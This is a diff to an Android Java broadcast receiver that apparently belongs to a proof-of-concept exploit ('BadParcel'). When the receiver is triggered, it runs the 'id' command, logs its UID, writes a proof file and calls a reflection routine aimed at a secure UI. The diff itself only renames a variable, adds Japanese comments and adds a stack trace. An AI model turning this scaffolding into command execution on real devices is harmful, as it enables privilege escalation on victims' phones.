@@ -12,25 +12,26 @@ import java.io.File;
 import java.io.FileOutputStream;
 import java.io.InputStreamReader;
 import java.io.PrintWriter;
-import java.lang.Process;
 
 public class SystemCommandReceiver extends BroadcastReceiver {
     @Override
     public void onReceive(Context context, Intent intent) {
+        // android.os.Process を明示的に使用
         int uid = Process.myUid();
         String msg = "[SystemCommandReceiver] onReceive called. UID=" + uid;
         Log.i("BadParcel", msg);
         MainActivity.appendLog(msg);
 
         try {
-            java.lang.Process process = Runtime.getRuntime().exec("id");
-            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+            // java.lang.Process は完全修飾名で使用（ただし競合を避けるため、変数名を proc に変更）
+            java.lang.Process proc = Runtime.getRuntime().exec("id");
+            BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getInputStream()));
             StringBuilder output = new StringBuilder();
             String line;
             while ((line = reader.readLine()) != null) {
                 output.append(line).append("\n");
             }
-            int exitCode = process.waitFor();
+            int exitCode = proc.waitFor();
             String result = "id output:\n" + output.toString() + "exit code: " + exitCode;
             MainActivity.appendLog(result);
 
@@ -47,9 +48,9 @@ public class SystemCommandReceiver extends BroadcastReceiver {
             MainActivity.appendLog("[+] Proof file created: " + proof.getAbsolutePath());
 
             attemptSecureUIReflection();
-
         } catch (Exception e) {
             MainActivity.appendLog("[-] System command execution failed: " + e.getMessage());
+            e.printStackTrace();
         }
     }
 
